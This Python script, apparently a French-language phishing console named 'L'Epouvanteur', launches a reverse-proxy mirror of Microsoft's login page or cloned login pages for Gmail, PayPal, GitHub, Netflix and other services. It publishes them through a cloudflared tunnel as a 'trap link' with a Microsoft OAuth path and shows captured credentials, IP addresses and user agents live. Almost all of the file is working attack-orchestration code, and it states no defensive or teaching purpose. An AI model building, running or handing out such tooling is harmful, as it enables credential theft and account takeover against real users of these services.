#!/usr/bin/env python3
# language: Python 3, file: epouvanteur.py, target: macOS
# L'EPOUVANTEUR - LA CONSOLE DU PHISHING : tu choisis la fausse page, il lance,
# tunnelise et te rend le LIEN PUBLIC. L'OEIL montre les captures en direct.
# Usage: python3 epouvanteur.py
import os, sys, subprocess, time, re, urllib.request
sys.path.insert(0, os.path.expanduser('~/Desktop/tool_DC'))
import dc_fullscreen as dfs

KIT = os.path.dirname(os.path.abspath(__file__))
MIRROR_PORT = 8086
CLONE_PORT = 8085
EYE_PORT = 8087
RUNNING = {}   # nom -> processus
TUNNEL_URL = ""

CLONES = ["gmail", "outlook", "facebook", "instagram", "twitter", "linkedin",
          "netflix", "paypal", "steam", "github", "snapchat", "tiktok"]

MS_OAUTH = ("/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-"
            "02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2Fmail")

def sh(cmd, log=None):
    print("  " + cmd)
    if log:
        f = open(log, "w")
        subprocess.Popen(cmd, shell=True, cwd=KIT, stdout=f, stderr=f)
    else:
        subprocess.Popen(cmd, shell=True, cwd=KIT,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def tunnel(port, log="/tmp/epouv_tunnel.log"):
    sh(f'pkill -f "cloudflared tunnel --url http://localhost:{port}"')
    time.sleep(0.5)
    sh(f'cloudflared tunnel --url http://localhost:{port} --no-autoupdate', log)
    print("  tunnel en montée (8 s)...")
    time.sleep(8)
    global TUNNEL_URL
    TUNNEL_URL = ""
    try:
        txt = open(log, errors="ignore").read()
        m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", txt)
        if m: TUNNEL_URL = m.group(0)
    except Exception:
        pass
    return TUNNEL_URL

def clear_pages():
    sh("pkill -f mirror_proxy.py")
    sh("pkill -f 'serve.py'")
    sh("pkill -f mirror_eye.py")
    sh('pkill -f "cloudflared tunnel"')
    RUNNING.clear()

def eye(caps_file):
    sh(f'pkill -f mirror_eye.py')
    sh(f'python3 -u mirror_eye.py {EYE_PORT} "{caps_file}"', "/tmp/epouv_eye.log")
    time.sleep(1)
    print(f"  [OEIL] http://127.0.0.1:{EYE_PORT}  (lectures de {caps_file})")

def start_mirror():
    sh(f'pkill -f mirror_proxy.py')
    sh(f'python3 -u mirror_proxy.py login.microsoftonline.com {MIRROR_PORT}', "/tmp/epouv_mirror.log")
    # le premier passage charge la vraie page en amont : tolerer plusieurs essais
    for attempt in range(4):
        time.sleep(2)
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{MIRROR_PORT}/", timeout=15)
            return True
        except Exception:
            continue
    return False

def start_clone(site):
    d = os.path.join(KIT, "sorties", "trick", site)
    if not os.path.exists(os.path.join(d, "serve.py")):
        print(f"  [forge] generation du kit {site}...")
        sh(f"python3 trick_forge.py {site} {CLONE_PORT}")
        time.sleep(1)
    sh("pkill -f 'serve.py'")
    sh(f'python3 -u sorties/trick/{site}/serve.py', f"/tmp/trick_{site}.log")
    time.sleep(2)
    return os.path.exists(os.path.join(d, "serve.py"))

def status():
    print("\n  --- SERVICES ACTIFS ---")
    for name, proc in RUNNING.items():
        print(f"   {name:<28} actif")
    if TUNNEL_URL:
        print(f"   tunnel                        {TUNNEL_URL}")
    else:
        print("   tunnel                        (aucun)")

def draw():
    os.system("clear")
    print("=" * 62)
    print("   SCARECROW - L'EPOUVANTEUR · powered by Maxime Leal")
    print("   la console du phishing : tu choisis, tu lances, tu regardes")
    print("=" * 62)
    print(f"\n   [m]  MICROSOFT — miroir pixel-perfect du vrai login (multi-etapes)")
    print(f"   [1-12] les clones : {', '.join(CLONES)}")
    print(f"   [o]  OEIL — captures en direct (identifiants + IP + UA)")
    print(f"   [t]  LIEN PUBLIC — tunnelise la page active")
    print(f"   [x]  tout arreter")
    print(f"   [q]  quitter la console (les serveurs restent)\n")
    status()

def pick(prompt="  epouvanteur> "):
    return input(prompt).strip().lower()

def main():
    dfs.hid()
    dfs.scarecrow_fullscreen(2.5)
    dfs.show()

    print("boot de l'epouvanteur...")
    while True:
        draw()
        c = pick()
        if c == "q":
            print("\n  l'epouvanteur se replie. (Ctrl+C dans les serveurs pour tout couper)\n")
            return
        elif c == "x":
            clear_pages(); print("  tout est arrete.")
        elif c == "m":
            print("  [miroir] login.microsoftonline.com reflète...")
            ok = start_mirror()
            if ok:
                RUNNING["MIROIR MICROSOFT :8086"] = True
                eye(os.path.join(KIT, "sorties", "mirror_captures.json"))
                print("  [OK] miroir actif. maintenant: [t] pour le lien public")
            else:
                print("  [X] miroir refuse — reessaie")
        elif c in [str(i) for i in range(1, 13)]:
            site = CLONES[int(c) - 1]
            ok = start_clone(site)
            if ok:
                RUNNING[f"CLONE {site.upper()} :8085"] = True
                caps = os.path.join(KIT, "sorties", "trick", site, "captures.json")
                eye(caps)
                print(f"  [OK] clone {site} actif. [t] pour le lien public")
            else:
                print(f"  [X] clone {site} a echoue")
        elif c == "o":
            caps = os.path.join(KIT, "sorties", "mirror_captures.json")
            # sinon le dernier kit clone genere
            for site in CLONES:
                p = os.path.join(KIT, "sorties", "trick", site, "captures.json")
                if os.path.exists(p): caps = p
            eye(caps)
            os.system(f"open http://127.0.0.1:{EYE_PORT}")
        elif c == "t":
            port = MIRROR_PORT if any("MIROIR" in k for k in RUNNING) else CLONE_PORT
            print("  [tunnel] montee...")
            url = tunnel(port)
            if url:
                path = MS_OAUTH if port == MIRROR_PORT else "/login"
                print(f"\n  ============ LIEN PIEGE PUBLIC ============")
                print(f"   {url}{path}")
                print(f"   captures : OEIL sur :{EYE_PORT}\n")
                os.system(f"open '{url}{path}'") if port == MIRROR_PORT else None
            else:
                print("  [X] tunnel refuse — verifie la connexion")
        else:
            print("  commande inconnue")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\n  replie.\n")
